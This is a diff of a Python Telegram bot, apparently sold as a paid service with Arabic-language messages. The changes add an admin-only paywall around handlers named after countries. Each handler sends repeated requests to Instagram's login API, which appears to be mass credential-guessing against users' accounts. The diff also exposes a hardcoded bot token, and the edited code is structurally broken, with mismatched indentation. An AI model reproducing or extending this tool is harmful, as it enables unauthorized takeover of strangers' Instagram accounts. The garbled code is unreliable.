@@ -18,32 +18,28 @@ Y = '\033[1;34m' #ازرق فاتح
 E = '\033[1;31m' #احمر
 C = "\033[1;97m" #ابيض
 
-CaRiNo= """                                                   
-       _     ___                   ___       
-      dM.    `MM                   `MM       
-     ,MMb     MM                    MM       
-     d'YM.    MM   _____     ____   MM  __   
-    ,P `Mb    MM  6MMMMMb   6MMMMb\ MM 6MMb  
-    d'  YM.   MM 6M'   `Mb MM'    ` MMM9 `Mb 
-   ,P   `Mb   MM MM     MM YM.      MM'   MM 
-   d'    YM.  MM MM     MM  YMMMMb  MM    MM 
-  ,MMMMMMMMb  MM MM     MM      `Mb MM    MM 
-  d'      YM. MM YM.   ,M9 L    ,MM MM    MM 
-_dM_     _dMM_MM_ YMMMMM9  MYMMMM9 _MM_  _MM_
 
-\033[1;31m--------------------------------
-\033[1;33m< \033[2;32mMy telegram channel ids tool CaRiNo \033[1;33m>
-\033[1;31m[\033[2;32m⌯\033[1;31m] \033[1;97mTelegram      : @ToOlsCaRiNo
-\033[1;31m[\033[2;32m⌯\033[1;31m] \033[1;97mDeveloper     : @tuikss
-\033[1;31m--------------------------------
- """
-#~~~~~~~~~~~~~~~{الاوان}~~~~~~~~~~~~~~~~#
-#~~~~~~~~~~~~~~~{Telegram}~~~~~~~~~~~~~~~~
-print(CaRiNo)
 ToKen = ("5554983256:AAFdqhzgehO5RwCc0e1XlmveBd9Rk8EIPa4")
-os.system('clear')
+admin=[5244755240,254264270]
+
+@bot.message_handler(commands=['start'])
+def start_message(message):
+    first = message.from_user.first_name
+    url = 'https://t.me/N1111V/3'
+    bot.send_animation((message.chat.id), url, caption=f"""اهلا {first}
+
+    بُكَ فِيُ بُۅتِ صِيُډ يُۅࢪِ࣪ࢪاެتِ تِيُݪيُجَࢪاެمِ
+اެݪبُۅتِ مِډفِۅعٰ ۅݪيُسُ مِجَاެنِيُ اެضِغِطَ /TXN
+ݪكَيُ اެتِحِقِقِ هَݪ اެنِتِ مِشِتِࢪكَ فِيُ اެݪبُۅتِ ❤️‍🔥
+___
+
+اެنِ كَنِتِ ݪسُتِ مِشِتِࢪكَ ࢪاެسُݪ اެݪمِطَۅࢪ @E_4_1 ݪكَيُ يُفِعٰݪ ݪكَ اެݪاެشِتِࢪاެكَ بُمِقِاެبُݪ بُسُيُطَ جَډاެ ❤️‍🔥""", reply_to_message_id=(message.message_id))
+
+@bot.message_handler(commands=['TXN','txn','Txn'])
+def hamo(message):
+    if message.from_user.id in admin:
 bot = telebot.TeleBot(ToKen)
-@bot.message_handler(commands = ["start"])
+@bot.message_handler(commands = ["TXN"])
 def Start(message):
  Name = message.chat.first_name
  User = message.from_user.username 
@@ -93,7 +89,7 @@ def Iran(message):
 	S = 0
 	B = 0
 	H = 0
-	while True:
+	for i in range(500):
 		url = 'https://www.instagram.com/api/v1/accounts/login/'
 		headers = {
 'accept': '*/*',
@@ -185,7 +181,7 @@ def Iraq(message):
 	S = 0
 	B = 0
 	H = 0
-	while True:
+	for i in range(500):
 		url = 'https://www.instagram.com/api/v1/accounts/login/'
 		headers = {
 'accept': '*/*',
@@ -276,7 +272,7 @@ def TR(message):
 	S = 0
 	B = 0
 	H = 0
-	while True:
+	for i in range(500):
 		url = 'https://www.instagram.com/api/v1/accounts/login/'
 		headers = {
 'accept': '*/*',
@@ -379,7 +375,7 @@ def EGYPT(message):
 	S = 0
 	B = 0
 	H = 0
-	while True:
+	for i in range(500):
 		url = 'https://www.instagram.com/api/v1/accounts/login/'
 		headers = {
 'accept': '*/*',
@@ -482,7 +478,7 @@ def Kuwait(message):
 	S = 0
 	B = 0
 	H = 0
-	while True:
+	for i in range(500):
 		url = 'https://www.instagram.com/api/v1/accounts/login/'
 		headers = {
 'accept': '*/*',
@@ -592,7 +588,7 @@ def SAUDIA(message):
 	S = 0
 	B = 0
 	H = 0
-	while True:
+	for i in range(500):
 		url = 'https://www.instagram.com/api/v1/accounts/login/'
 		headers = {
 'accept': '*/*',
@@ -697,7 +693,7 @@ def Morocco(message):
 	S = 0
 	B = 0
 	H = 0
-	while True:
+	for i in range(500):
 		url = 'https://www.instagram.com/api/v1/accounts/login/'
 		headers = {
 'accept': '*/*',
